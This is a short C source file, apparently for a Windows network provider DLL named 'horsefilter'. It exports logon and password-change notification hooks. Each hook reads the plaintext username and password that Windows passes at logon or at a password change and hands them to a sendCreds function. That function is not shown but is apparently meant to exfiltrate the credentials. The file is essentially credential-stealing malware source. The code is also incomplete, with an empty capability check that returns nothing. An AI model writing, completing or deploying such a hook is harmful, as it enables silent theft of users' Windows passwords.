#include "horsefilter.h"
#include <windows.h>
#include <ntsecapi.h>
#include <npapi.h>

__declspec(dllexport)
DWORD NPGetCaps(DWORD ndex)
{
    if (ndex == WNNC_START)
    {
        
    }
}

__declspec(dllexport)
DWORD NPLogonNotify(
    PLUID   lpLogonId,
    LPCWSTR lpAuthentInfoType,
    LPVOID  lpAuthentInfo,
    LPCWSTR lpPreviousAuthentInfoType,
    LPVOID  lpPreviousAuthentInfo,
    LPWSTR  lpStationName,
    LPVOID  StationHandle,
    LPWSTR  *lpLogonScript
)
{
    MSV1_0_INTERACTIVE_LOGON *auth = (MSV1_0_INTERACTIVE_LOGON *)lpAuthentInfo;
    sendCreds(&auth->UserName, &auth->Password);
    return EXIT_SUCCESS;
}

DWORD NPPasswordChangeNotify(
    LPCWSTR lpAuthentInfoType,
    LPVOID  lpAuthentInfo,
    LPCWSTR lpPreviousAuthentInfoType,
    LPVOID  lpPreviousAuthentInfo,
    LPWSTR  lpStationName,
    LPVOID  StationHandle,
    DWORD   dwChangeInfo
)
{
    MSV1_0_INTERACTIVE_LOGON *auth = (MSV1_0_INTERACTIVE_LOGON *)lpAuthentInfo;
    sendCreds(&auth->UserName, &auth->Password);
    return EXIT_SUCCESS;
}